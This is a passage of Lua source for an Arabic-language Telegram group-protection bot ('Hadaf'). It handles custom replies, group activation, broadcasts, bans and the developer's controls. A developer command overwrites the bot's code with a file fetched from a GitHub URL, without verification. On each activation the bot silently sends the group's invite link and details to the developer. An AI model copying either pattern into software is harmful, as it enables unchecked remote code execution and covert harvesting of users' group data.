local TotalMsg = Total_message(NumMsg)
local Status_Gps = Get_Rank(msg.sender_user_id_,msg.chat_id_)
local NumMessageEdit = redis:get(bot_id..'Hadaf:Num:Message:Edit'..msg.chat_id_..msg.sender_user_id_) or 0
local Text = Text:gsub('#username',(data.username_ or 'لا يوجد')) 
local Text = Text:gsub('#name',data.first_name_)
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',NumMessageEdit)
local Text = Text:gsub('#msgs',NumMsg)
local Text = Text:gsub('#stast',Status_Gps)
send(msg.chat_id_, msg.id_, Text)
redis:sadd(bot_id.."Hadaf:Spam_For_Bot"..msg.sender_user_id_,text) 
end,nil)
end
if stekr then 
sendSticker(msg.chat_id_,msg.id_,stekr)
redis:sadd(bot_id.."Hadaf:Spam_For_Bot"..msg.sender_user_id_,text) 
end
if veico then 
sendVoice(msg.chat_id_, msg.id_,veico,"")
redis:sadd(bot_id.."Hadaf:Spam_For_Bot"..msg.sender_user_id_,text) 
end
if video then 
sendVideo(msg.chat_id_, msg.id_,video,"")
redis:sadd(bot_id.."Hadaf:Spam_For_Bot"..msg.sender_user_id_,text) 
end
if anemi then 
sendAnimation(msg.chat_id_, msg.id_,anemi,"")   
redis:sadd(bot_id.."Hadaf:Spam_For_Bot"..msg.sender_user_id_,text) 
end
if document then
sendDocument(msg.chat_id_, msg.id_, document)   
redis:sadd(bot_id.."Hadaf:Spam_For_Bot"..msg.sender_user_id_,text) 
end  
if audio then
sendAudio(msg.chat_id_,msg.id_,audio)  
redis:sadd(bot_id.."Hadaf:Spam_For_Bot"..msg.sender_user_id_,text) 
end
if photo then
sendPhoto(msg.chat_id_,msg.id_,photo,photo_caption)
redis:sadd(bot_id.."Hadaf:Spam_For_Bot"..msg.sender_user_id_,text) 
end  
end
end
------------------------------------------------------------------------------------------------------------
if text or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.animation_ or msg.content_.audio_ or msg.content_.document_ or msg.content_.photo_ or msg.content_.video_ then  
local test = redis:get(bot_id.."Hadaf:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if redis:get(bot_id.."Hadaf:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
redis:del(bot_id.."Hadaf:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_)
if msg.content_.sticker_ then   
redis:set(bot_id.."Hadaf:Add:Rd:Sudo:stekr"..test, msg.content_.sticker_.sticker_.persistent_id_)  
end   
if msg.content_.voice_ then  
redis:set(bot_id.."Hadaf:Add:Rd:Sudo:vico"..test, msg.content_.voice_.voice_.persistent_id_)  
end   
if msg.content_.animation_ then   
redis:set(bot_id.."Hadaf:Add:Rd:Sudo:Gif"..test, msg.content_.animation_.animation_.persistent_id_)  
end  
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
redis:set(bot_id.."Hadaf:Add:Rd:Sudo:Text"..test, text)  
end  
if msg.content_.audio_ then
redis:set(bot_id.."Hadaf:Add:Rd:Sudo:Audio"..test, msg.content_.audio_.audio_.persistent_id_)  
end
if msg.content_.document_ then
redis:set(bot_id.."Hadaf:Add:Rd:Sudo:File"..test, msg.content_.document_.document_.persistent_id_)  
end
if msg.content_.video_ then
redis:set(bot_id.."Hadaf:Add:Rd:Sudo:Video"..test, msg.content_.video_.video_.persistent_id_)  
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
redis:set(bot_id.."Hadaf:Add:Rd:Sudo:Photo"..test, photo_in_group)  
end
send(msg.chat_id_, msg.id_,"📌┇تم حفظ رد عام \n⚠️️┇ارسل ( "..test.." ) لرؤية الرد")
return false  
end  
end
------------------------------------------------------------------------------------------------------------
if text and text:match("^(.*)$") then
if redis:get(bot_id.."Hadaf:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\n⚠️️┇ارسل لي الكلمه الان \n🔖┇تستطيع اضافة ← { ملف ، فديو ، نص ، ملصق ، بصمه ، متحركه }\n📬┇تستطيع ايضا اضافة :\n👤┇`#username` » معرف المستخدم \n📨┇`#msgs` » عدد الرسائل\n👤┇`#name` » اسم المستخدم\n🚸┇`#id` » ايدي المستخدم\n📮┇`#stast` » موقع المستخدم \n📝┇`#edit` » عدد التعديلات ')
redis:set(bot_id.."Hadaf:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
redis:set(bot_id.."Hadaf:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
redis:sadd(bot_id.."Hadaf:List:Rd:Sudo", text)
return false end
end
------------------------------------------------------------------------------------------------------------
if text and text:match("^(.*)$") then
if redis:get(bot_id.."Hadaf:Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_,"✅┇تم حذف الرد من ردود العام")
list = {"Add:Rd:Sudo:Audio","Add:Rd:Sudo:File","Add:Rd:Sudo:Video","Add:Rd:Sudo:Photo","Add:Rd:Sudo:Text","Add:Rd:Sudo:stekr","Add:Rd:Sudo:vico","Add:Rd:Sudo:Gif"}
for k,v in pairs(list) do
redis:del(bot_id..'Hadaf:'..v..text)
end
redis:del(bot_id.."Hadaf:Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
redis:srem(bot_id.."Hadaf:List:Rd:Sudo", text)
return false
end
end
if Dev_Hadaf(msg) then
if text == "تحديث الملفات ♻️" then
dofile("Hadaf.lua")  
send(msg.chat_id_, msg.id_, "♻️┇تم تحديث ملفات البوت")
elseif text == "تحديث" then
dofile("Hadaf.lua")  
send(msg.chat_id_, msg.id_, "♻️┇تم تحديث ملفات البوت")
elseif text == 'تحديث السورس 🔂' then
download_to_file('https://raw.githubusercontent.com/Hadafsource/Hadaf/master/Hadaf.lua','Hadaf.lua') 
send(msg.chat_id_, msg.id_, "🔂┇تم تحديث السورس وتنزيل اخر تحديث للملفات")
elseif text == 'تحديث السورس' then
download_to_file('https://raw.githubusercontent.com/Hadafsource/Hadaf/master/Hadaf.lua','Hadaf.lua') 
send(msg.chat_id_, msg.id_, "🔂┇تم تحديث السورس وتنزيل اخر تحديث للملفات")
end
end
------------------------------------------------------------------------------------------------------------
if text and not redis:get(bot_id.."Hadaf:Reply:Sudo"..msg.chat_id_) then
if not redis:sismember(bot_id..'Hadaf:Spam_For_Bot'..msg.sender_user_id_,text) then
local anemi = redis:get(bot_id.."Hadaf:Add:Rd:Sudo:Gif"..text)   
local veico = redis:get(bot_id.."Hadaf:Add:Rd:Sudo:vico"..text)   
local stekr = redis:get(bot_id.."Hadaf:Add:Rd:Sudo:stekr"..text)     
local Text = redis:get(bot_id.."Hadaf:Add:Rd:Sudo:Text"..text)   
local photo = redis:get(bot_id.."Hadaf:Add:Rd:Sudo:Photo"..text)
local video = redis:get(bot_id.."Hadaf:Add:Rd:Sudo:Video"..text)
local document = redis:get(bot_id.."Hadaf:Add:Rd:Sudo:File"..text)
local audio = redis:get(bot_id.."Hadaf:Add:Rd:Sudo:Audio"..text)
if Text then 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,data)
local NumMsg = redis:get(bot_id..'Hadaf:Num:Message:User'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = Get_Rank(msg.sender_user_id_,msg.chat_id_)
local NumMessageEdit = redis:get(bot_id..'Hadaf:Num:Message:Edit'..msg.chat_id_..msg.sender_user_id_) or 0
local Text = Text:gsub('#username',(data.username_ or 'لا يوجد')) 
local Text = Text:gsub('#name',data.first_name_)
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',NumMessageEdit)
local Text = Text:gsub('#msgs',NumMsg)
local Text = Text:gsub('#stast',Status_Gps)
send(msg.chat_id_, msg.id_,Text)
redis:sadd(bot_id.."Hadaf:Spam_For_Bot"..msg.sender_user_id_,text) 
end,nil)
end
if stekr then 
sendSticker(msg.chat_id_,msg.id_,stekr) 
redis:sadd(bot_id.."Hadaf:Spam_For_Bot"..msg.sender_user_id_,text) 
end
if veico then 
sendVoice(msg.chat_id_, msg.id_,veico,"")
redis:sadd(bot_id.."Hadaf:Spam_For_Bot"..msg.sender_user_id_,text) 
end
if video then 
sendVideo(msg.chat_id_, msg.id_,video,"")
redis:sadd(bot_id.."Hadaf:Spam_For_Bot"..msg.sender_user_id_,text) 
end
if anemi then 
sendAnimation(msg.chat_id_, msg.id_,anemi,"")   
redis:sadd(bot_id.."Hadaf:Spam_For_Bot"..msg.sender_user_id_,text) 
end
if document then
sendDocument(msg.chat_id_, msg.id_, document)     
redis:sadd(bot_id.."Hadaf:Spam_For_Bot"..msg.sender_user_id_,text) 
end  
if audio then
sendAudio(msg.chat_id_,msg.id_,audio)  
redis:sadd(bot_id.."Hadaf:Spam_For_Bot"..msg.sender_user_id_,text) 
end
if photo then
sendPhoto(msg.chat_id_,msg.id_,photo,"")
redis:sadd(bot_id.."Hadaf:Spam_For_Bot"..msg.sender_user_id_,text) 
end  
end
------------------------------------------------------------------------------------------------------------
if text and redis:get(bot_id..'Hadaf:Set:Cmd:Start:Bots') then
if text == 'الغاء ✖' then   
send(msg.chat_id_, msg.id_,"⚠️┇تم الغاء حفظ كليشه امر /start") 
redis:del(bot_id..'Hadaf:Set:Cmd:Start:Bots') 
return false
end
redis:set(bot_id.."Hadaf:Set:Cmd:Start:Bot",text)  
send(msg.chat_id_, msg.id_,'✅┇تم حفظ كليشه امر /start في البوت') 
redis:del(bot_id..'Hadaf:Set:Cmd:Start:Bots') 
return false
end
------------------------------------------------------------------------------------------------------------
end
------------------------------------------------------------------------------------------------------------
if text == 'تفعيل' and DeveloperBot(msg) then
 
if TypeForChat ~= 'ForSuppur' then
send(msg.chat_id_, msg.id_,'⚠️┇المجموعه عاديه وليست خارقه لا تستطيع تفعيلي يرجى ان تضع سجل رسائل المجموعه ظاهر وليس مخفي ومن بعدها يمكنك رفعي ادمن ثم تفعيلي') 
return false
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'🚸┇أنا لست ادمن يرجى ترقيتي !') 
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
if tonumber(data.member_count_) < tonumber(redis:get(bot_id..'Hadaf:Num:Add:Bot') or 0) and not Dev_Hadaf(msg) then
send(msg.chat_id_, msg.id_,'⚠️┇لا تستطيع تفعيل المجموعه بسبب قلة عدد اعضاء المجموعه يجب ان يكون اكثر من *:'..(redis:get(bot_id..'Hadaf:Num:Add:Bot') or 0)..'* عضو')
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
if redis:sismember(bot_id..'Hadaf:ChekBotAdd',msg.chat_id_) then
send(msg.chat_id_, msg.id_,'⚡┇تم تفعيل المجموعه مسبقا')
else
Send_Options(msg,result.id_,'reply_Add','⚠️️┇تم تفعيل مجموعه '..chat.title_..'')
redis:sadd(bot_id..'Hadaf:ChekBotAdd',msg.chat_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = chat.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local IdChat = msg.chat_id_
local NumMember = data.member_count_
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
LinkGp = linkgpp.result
else
LinkGp = 'لا يوجد'
end
if not Dev_Hadaf(msg) then
sendText(Id_Dev,'✅┇تم تفعيل مجموعه جديده\n'..'\n💢┇بواسطة : '..Name..''..'\n🔖┇ايدي المجموعه : `'..IdChat..'`'..'\n👥┇عدد اعضاء المجموعه *: '..NumMember..'*'..'\n📛┇اسم المجموعه : ['..NameChat..']'..'\n⚠️️┇الرابط : ['..LinkGp..']',0,'md')
end
end
end,nil) 
end,nil) 
end,nil)
end
------------------------------------------------------------------------------------------------------------
if text == 'تعطيل' and DeveloperBot(msg) then
 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
if not redis:sismember(bot_id..'Hadaf:ChekBotAdd',msg.chat_id_) then
send(msg.chat_id_, msg.id_,'⚡┇المجموعه بالتاكيد معطله')
else
Send_Options(msg,result.id_,'reply_Add','⚠️️┇تم تعطيل مجموعه '..chat.title_..'')
redis:srem(bot_id..'Hadaf:ChekBotAdd',msg.chat_id_)  
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = chat.title_
NameChat = NameChat:gsub('"',"") 
NameChat = NameChat:gsub('"',"") 
NameChat = NameChat:gsub("`","") 
NameChat = NameChat:gsub("*","") 
NameChat = NameChat:gsub("{","") 
NameChat = NameChat:gsub("}","") 
local IdChat = msg.chat_id_
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
LinkGp = linkgpp.result
else
LinkGp = 'لا يوجد'
end
if not Dev_Hadaf(msg) then
sendText(Id_Dev,'✅┇تم تعطيل مجموعه جديده\n'..'\n💢┇بواسطة : '..Name..''..'\n🔖┇ايدي المجموعه : `'..IdChat..'`\n📛┇اسم المجموعه : ['..NameChat..']',0,'md')
end
end
end,nil) 
end,nil) 
end
------------------------------------------------------------------------------------------------------------
if text == 'تفعيل' and not DeveloperBot(msg) and not redis:get(bot_id..'Hadaf:Free:Bot') then
 
if TypeForChat ~= 'ForSuppur' then
send(msg.chat_id_, msg.id_,'⚠️┇المجموعه عاديه وليست خارقه لا تستطيع تفعيلي يرجى ان تضع سجل رسائل المجموعه ظاهر وليس مخفي ومن بعدها يمكنك رفعي ادمن ثم تفعيلي') 
return false
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'⚠️┇البوت ليس ادمن يرجى ترقيتي') 
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,DataChat) 
if DataChat and DataChat.status_.ID == "ChatMemberStatusEditor" or DataChat and DataChat.status_.ID == "ChatMemberStatusCreator" then
if DataChat and DataChat.user_id_ == msg.sender_user_id_ then
if DataChat.status_.ID == "ChatMemberStatusCreator" then
Status_Rt = 'المنشئ'
elseif DataChat.status_.ID == "ChatMemberStatusEditor" then
Status_Rt = 'الادمن'
else 
Status_Rt = 'عضو'
end
if redis:sismember(bot_id..'Hadaf:ChekBotAdd',msg.chat_id_) then
send(msg.chat_id_, msg.id_,'⚡┇تم تفعيل المجموعه مسبقا')
return false
end
if tonumber(data.member_count_) < tonumber(redis:get(bot_id..'Hadaf:Num:Add:Bot') or 0) and not Dev_Hadaf(msg) then
send(msg.chat_id_, msg.id_,'⚠️┇لا تستطيع تفعيل المجموعه بسبب قلة عدد اعضاء المجموعه يجب ان يكون اكثر من *:'..(redis:get(bot_id..'Hadaf:Num:Add:Bot') or 0)..'* عضو')
return false
end
Send_Options(msg,msg.sender_user_id_,'reply_Add','⚠️️┇تم تفعيل مجموعه '..chat.title_..'')
redis:sadd(bot_id..'Hadaf:ChekBotAdd',msg.chat_id_)  
redis:sadd(bot_id..'Hadaf:President:Group'..msg.chat_id_, msg.sender_user_id_)
local LinkApi = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkApi.ok == true then 
LinkChat = LinkApi.result
else
LinkChat = 'لا يوجد'
end
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NumMember = data.member_count_
local NameChat = chat.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
if not Dev_Hadaf(msg) then
sendText(Id_Dev,'✅┇تم تفعيل مجموعه جديده\n💢┇بواسطة : '..Name..'\n🚸┇موقعه في المجموعه : '..Status_Rt..'\n🔖┇ايدي المجموعه : `'..msg.chat_id_..'`\n👥┇عدد اعضاء المجموعه *: '..NumMember..'*\n📛┇اسم المجموعه : ['..NameChat..']\n⚠️️┇الرابط : ['..LinkChat..']',0,'md')
end
end
end
end,nil)   
end,nil) 
end,nil) 
end,nil) 
end
------------------------------------------------------

if TypeForChat == ("ForUser") then
if text == '/start' then  

if Dev_Hadaf(msg) then
local Text_keyboard = '⚠️️┇اهلا بك في اوامر الكيبورد الجاهزه'
local List_keyboard = {
{'تفعيل تواصل البوت 🔔','تعطيل تواصل البوت 🔕'},
{'اذاعه خاص 👤','اذاعه للمجموعات 👥'},
{'اذاعه خاص بالتوجيه 👤','اذاعه بالتوجيه 👥'},
{'اذاعه بالتثبيت 📌'},
{'احصائيات البوت 📑'},
{'تفعيل مغادرة البوت ✅','تعطيل مغادرة البوت ❌'},
{'تفعيل اذاعه المطورين 🔓','تعطيل اذاعه المطورين 🔏'},
{'تفعيل الوضع الخدمي 🔖','تعطيل الوضع الخدمي 〽'},
{'تنظيف المجموعات 🔄','تنظيف المشتركين 🚯'},
{'مسح قائمه العام 💯','مسح قائمه المطورين 🚫'},
{'ازالة كليشه ستارت 🔗','تغيير كليشه ستارت 🦋'},
{'قائمه العام 📝','قائمه المطورين 📝'},
{'تغيير اسم البوت 🔄'},
{'تغيير كليشة المطور 🆕','ازالة كليشة المطور 🆗'},
{'تحديث الملفات ♻️','تحديث السورس 🔂'},
{'جلب نسخة خزن القروبات 📦'},
{'الغاء ✖'}
}
send_inline_keyboard(msg.chat_id_,Text_keyboard,List_keyboard)
else
if not redis:get(bot_id..'Hadaf:Ban:Cmd:Start'..msg.sender_user_id_) then
local GetCmdStart = redis:get(bot_id.."Hadaf:Set:Cmd:Start:Bot")  
if not GetCmdStart then 
CmdStart = '\n🙋┇أهلًا بك في بوت '..(redis:get(bot_id.."Hadaf:Redis:Name:Bot") or "هدف")..''..
'\n⚠️️┇اختصاص البوت حماية المجموعات'..
'\n✅┇لتفعيل البوت عليك اتباع مايلي ...'..
'\n👥┇اضف البوت الى مجموعتك'..
'\n⚡┇ارفعه ادمن {مشرف}'..
'\n⛔┇ارسل كلمة { تفعيل } ليتم تفعيل المجموعه'..
'\n📛┇سيتم ترقيتك منشئ اساسي في البوت'..
'\n🚸┇مطور البوت ← {['..UserName_Dev..']}'
send(msg.chat_id_, msg.id_,CmdStart) 
else
send(msg.chat_id_, msg.id_,GetCmdStart) 
end 
end
end
redis:setex(bot_id..'Hadaf:Ban:Cmd:Start'..msg.sender_user_id_,60,true)
return false
end
if not Dev_Hadaf(msg) and not redis:sismember(bot_id..'Hadaf:User:Ban:Pv',msg.sender_user_id_) and not redis:get(bot_id..'Hadaf:Lock:Twasl') then
send(msg.sender_user_id_,msg.id_,'📨┇تم ارسال رسالتك الى المطور ← { ['..UserName_Dev..'] }')    
local List_id = {Id_Dev,msg.sender_user_id_}
for k,v in pairs(List_id) do   
tdcli_function({ID="GetChat",chat_id_=v},function(arg,chat) end,nil)
end
tdcli_function({ID="ForwardMessages",chat_id_=Id_Dev,from_chat_id_= msg.sender_user_id_,message_ids_={[0]=msg.id_},disable_notification_=1,from_background_=1},function(arg,data) 
if data and data.messages_ and data.messages_[0] ~= false and data.ID ~= "Error" then
if data and data.messages_ and data.messages_[0].content_.sticker_ then
Send_Optionspv(Id_Dev,0,msg.sender_user_id_,"reply_Pv","⚠️️┇قام بارسال الملصق")  
return false
end
end
end,nil)
end
if Dev_Hadaf(msg) then
if msg.reply_to_message_id_ ~= 0  then    
tdcli_function({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)},function(extra, result, success) 
if result.forward_info_.sender_user_id_ then     
UserForward = result.forward_info_.sender_user_id_    
end     
if text == 'حظر' then
Send_Optionspv(Id_Dev,msg.id_,UserForward,"reply_Pv","⚠️️┇تم حظره من تواصل البوت")  
redis:sadd(bot_id..'Hadaf:User:Ban:Pv',data.id_)  
return false  
elseif text =='الغاء الحظر' then
Send_Optionspv(Id_Dev,msg.id_,UserForward,"reply_Pv","⚠️️┇تم الغاء حظره من تواصل البوت")  
redis:srem(bot_id..'Hadaf:User:Ban:Pv',data.id_)  
return false  
end 
tdcli_function({ID='GetChat',chat_id_=UserForward},function(a,s) end,nil)
tdcli_function({ID="SendChatAction",chat_id_=UserForward,action_={ID="SendMessageTypingAction",progress_=100}},function(arg,Get_Status) 
if (Get_Status.code_) == (400) or (Get_Status.code_) == (5) then
Send_Optionspv(Id_Dev,msg.id_,UserForward,"reply_Pv","⚠️┇قام بحظر البوت لا تستطيع ارسال له رسائل")  
return false  
end 
if text then    
send(UserForward,msg.id_,text)    
elseif msg.content_.ID == 'MessageSticker' then    
sendSticker(UserForward, msg.id_, msg.content_.sticker_.sticker_.persistent_id_)   
elseif msg.content_.ID == 'MessagePhoto' then    
sendPhoto(UserForward, msg.id_,msg.content_.photo_.sizes_[0].photo_.persistent_id_,(msg.content_.caption_ or ''))    
elseif msg.content_.ID == 'MessageAnimation' then    
sendDocument(UserForward, msg.id_, msg.content_.animation_.animation_.persistent_id_)    
elseif msg.content_.ID == 'MessageVoice' then    
sendVoice(UserForward, msg.id_, msg.content_.voice_.voice_.persistent_id_)    
end     
Send_Optionspv(Id_Dev,msg.id_,UserForward,"reply_Pv","✅┇تم ارسال رسالتك اليه بنجاح")  
end,nil)end,nil)
end
if text == 'تغيير كليشه ستارت 🦋' then
redis:set(bot_id..'Hadaf:Set:Cmd:Start:Bots',true) 
send(msg.chat_id_, msg.id_,'⚠️️┇ارسل الان الكليشه ليتم وضعها') 
elseif text == 'ازالة كليشه ستارت 🔗' then
redis:del(bot_id..'Hadaf:Set:Cmd:Start:Bot') 
send(msg.chat_id_, msg.id_,'✅┇تم حذف كليشه ستارت') 
elseif text == "تفعيل مغادرة البوت ✅" then   
redis:del(bot_id.."Hadaf:Lock:Left"..msg.chat_id_)  
send(msg.chat_id_, msg.id_,"✅┇تم تفعيل مغادرة البوت") 
elseif text == "تعطيل مغادرة البوت ❌" then  
redis:set(bot_id.."Hadaf:Lock:Left"..msg.chat_id_,true)   
send(msg.chat_id_, msg.id_, "✅┇تم تعطيل مغادرة البوت") 
elseif text == "تفعيل اذاعه المطورين 🔓" then  
redis:del(bot_id.."Hadaf:Broadcasting:Bot") 
send(msg.chat_id_, msg.id_,"✅┇تم تفعيل الاذاعه \n⚠️️┇الان يمكن للمطورين الاذاعه" ) 
elseif text == "تعطيل اذاعه المطورين 🔏" then  
redis:set(bot_id.."Hadaf:Broadcasting:Bot",true) 
send(msg.chat_id_, msg.id_,"✅┇تم تعطيل الاذاعه") 
elseif text == 'تفعيل الوضع الخدمي 🔖' then  
redis:del(bot_id..'Hadaf:Free:Bot') 
send(msg.chat_id_, msg.id_,'✅┇تم تفعيل البوت الخدمي \n⚡┇الان يمكن الجميع تفعيله') 
elseif text == 'تعطيل الوضع الخدمي 〽' then  
redis:set(bot_id..'Hadaf:Free:Bot',true) 
send(msg.chat_id_, msg.id_,'✅┇تم تعطيل البوت الخدمي') 
elseif text == 'تغيير كليشة المطور 🆕' then
redis:set(bot_id..'Hadaf:GetTexting:DevHadaf'..msg.chat_id_..':'..msg.sender_user_id_,true)
send(msg.chat_id_,msg.id_,'📮┇ ارسل لي الكليشه الان')
elseif text=="اذاعه خاص 👤" then 
redis:setex(bot_id.."Hadaf:Broadcasting:Users" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"🔘┇ارسل لي المنشور الان\n⚠️️┇يمكنك ارسال -{ صوره - ملصق - متحركه - رساله }\n⚠️┇لالغاء الاذاعه ارسل : الغاء") 
return false
elseif text=="اذاعه للمجموعات 👥" then 
redis:setex(bot_id.."Hadaf:Broadcasting:Groups" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"🔘┇ارسل لي المنشور الان\n⚠️️┇يمكنك ارسال -{ صوره - ملصق - متحركه - رساله }\n⚠️┇لالغاء الاذاعه ارسل : الغاء") 
return false
elseif text=="اذاعه بالتثبيت 📌" and DeveloperBot(msg) then 
redis:setex(bot_id.."Hadaf:Broadcasting:Groups:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"🔘┇ارسل لي المنشور الان\n⚠️️┇يمكنك ارسال -{ صوره - ملصق - متحركه - رساله }\n⚠️┇لالغاء الاذاعه ارسل : الغاء") 
return false
elseif text=="اذاعه بالتوجيه 👥" and DeveloperBot(msg) then 
redis:setex(bot_id.."Hadaf:Broadcasting:Groups:Fwd" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"⚠️️┇ارسل لي التوجيه الان\n✅┇ليتم نشره في المجموعات") 
return false
elseif text=="اذاعه خاص بالتوجيه 👤" and DeveloperBot(msg) then 
redis:setex(bot_id.."Hadaf:Broadcasting:Users:Fwd" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"⚠️️┇ارسل لي التوجيه الان\n✅┇ليتم نشره الى المشتركين") 
return false
elseif text == 'ازالة كليشة المطور 🆗' then
redis:del(bot_id..'Hadaf:Texting:DevHadaf')
send(msg.chat_id_, msg.id_,'✅┇ تم حذف كليشه المطور')
elseif text == "تغيير اسم البوت 🔄" then 
redis:setex(bot_id.."Hadaf:Change:Name:Bot"..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_,"📫┇ ارسل لي الاسم الان ")  
return false
elseif text == ("مسح قائمه العام 💯") or text == ("مسح المحظورين عام") then
redis:del(bot_id.."Hadaf:Removal:User:Groups")
send(msg.chat_id_, msg.id_, "🗑┇تم مسح المحظورين عام من البوت")
elseif text == ("مسح قائمه المطورين 🚫") then
redis:del(bot_id.."Hadaf:Developer:Bot")
send(msg.chat_id_, msg.id_, "🗑┇ تم مسح المطورين من البوت  ")
elseif text == ("قائمه العام 📝") or text == ("المحظورين عام") then
local list = redis:smembers(bot_id.."Hadaf:Removal:User:Groups")
Gban = "\n📄┇قائمة المحظورين عام في البوت\n━━━━━━━━━━━━━\n"
for k,v in pairs(list) do
local username = redis:get(bot_id.."Hadaf:Save:Username" .. v)
if username then
Gban = Gban..""..k.."~ : [@"..username.."]\n"
else
Gban = Gban..""..k.."~ : `"..v.."`\n"
end
end
if #list == 0 then
Gban = "⚠️┇لا يوجد محظورين عام"
end
send(msg.chat_id_, msg.id_, Gban)
elseif text == ("قائمه المطورين 📝") then
local list = redis:smembers(bot_id.."Hadaf:Developer:Bot")
Sudos = "\n📄┇قائمة المطورين في البوت \n━━━━━━━━━━━━━\n"
for k,v in pairs(list) do
local username = redis:get(bot_id.."Hadaf:Save:Username" .. v)
if username then
Sudos = Sudos..""..k.."~ : [@"..username.."]\n"
else
Sudos = Sudos..""..k.."~ : `"..v.."`\n"
end
end
if #list == 0 then
Sudos = "⚠️┇لا يوجد مطورين"
end
send(msg.chat_id_, msg.id_, Sudos)
elseif text and text:match("^حظر عام @(.*)$") then
function FunctionStatus(arg, result)
if (result.id_) then
if result and result.type_ and result.type_.ID == ("ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⚠️┇عذرًا هذا معرف قناة")   
return false 
end      
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "⚠️┇لا تسطيع حظر البوت عام")
return false 
end
if Dev_Hadaf_User(result.id_) == true then
send(msg.chat_id_, msg.id_, "⚠️┇لا تستطيع حظر المطور الاساسي عام")
return false 
end
redis:sadd(bot_id.."Hadaf:Removal:User:Groups", result.id_)
Send_Options(msg,result.id_,"reply","✅┇تم حظره عام من المجموعات")  
else
send(msg.chat_id_, msg.id_,"❌┇المعرف غلط ")
end
end
